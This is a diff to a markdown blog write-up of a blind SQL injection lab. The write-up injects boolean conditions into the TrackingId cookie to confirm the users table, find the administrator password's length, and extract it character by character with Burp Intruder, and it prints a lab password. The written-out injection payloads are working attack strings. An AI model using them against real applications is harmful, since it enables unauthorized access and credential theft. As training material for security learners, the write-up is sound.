@@ -52,11 +52,11 @@ This confirms the parameter is vulnerable to Blind SQL Injection.
 
 ### 2. Confirm the users table exists
 
----sql
+```
 'select tracking-id from tracking-table 
 'where trackingId = 'RvLfBu6s9EZRlVYN' 
 'and (select 'x' from users LIMIT 1)='x'-- 
----
+```
 
 <div style="text-align: center;">
   <img src="/top10-owasp-blog/assets/images/wu2.png" alt="SQL Injection Diagram" style="width: 40%; border: 1px solid #ccc; border-radius: 8px;">
@@ -66,11 +66,11 @@ This confirms the parameter is vulnerable to Blind SQL Injection.
 ==>  users table exists.
 
 ### 3. Confirm administrator user exists
---
+```
 select tracking-id from tracking-table 
 where trackingId = 'RvLfBu6s9EZRlVYN' 
 and (select username from users where username='administrator')='administrator'-- 
---
+```
 
 ==> administrator user exists.
 
@@ -81,9 +81,9 @@ and (select username from users where username='administrator')='administrator'-
 
 ### 4. Determine the password length
 
----sql
+```
 ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)=20)='administrator'--
----
+```
 
 If the length is x , the subquery returns administrator, making the comparison = 'administrator' TRUE.
 The app will display the "Welcome back" message.
@@ -95,8 +95,9 @@ By adjusting the number in LENGTH(password)=X and observing the response, you ca
 
 ### 5. Extract the password character-by-character
 
-* Send a vulnerable request to Intruder
-* In Intruder, highlight the value of the TrackingId cookie after the ' and mark it as a payload position:
+- Send a vulnerable request to Intrude
+- In Intruder, highlight the value of the TrackingId cookie after the ' and mark it as a payload position:
+
 --
 ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='a'--
 --
@@ -107,19 +108,19 @@ By adjusting the number in LENGTH(password)=X and observing the response, you ca
 -Set the payload type to Simple list.
 -Enter all possible characters:
 
----sql
+```
 'abcdefghijklmnopqrstuvwxyz
 'ABCDEFGHIJKLMNOPQRSTUVWXYZ
 '0123456789
----
+```
 
 * Run the attack for each character position
 
 Start with position 1:
 
----sql
+```
 ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1)='§a§'--
----
+```
 
 ==> Look at the Length or Response column in the Intruder results, If it’s longer or contains "Welcome back", that character is correct and repeat for positions 1 → 20.
 Write down each discovered character in order until you have all 20.
@@ -132,9 +133,9 @@ Example found password in my lab :
 
 Use Burp Repeater to check if it matches the administrator account:
 
----sql
+```
 ' AND SUBSTRING((SELECT username FROM users WHERE password='52rabjtjpa749cy0bvo6'),1,1)='a'--
----
+```
 
 ==> If it returns the "Welcome back" message → the password is correct , and you can test
 in lab with Username: administrator and Password: 52rabjtjpa749cy0bvo6
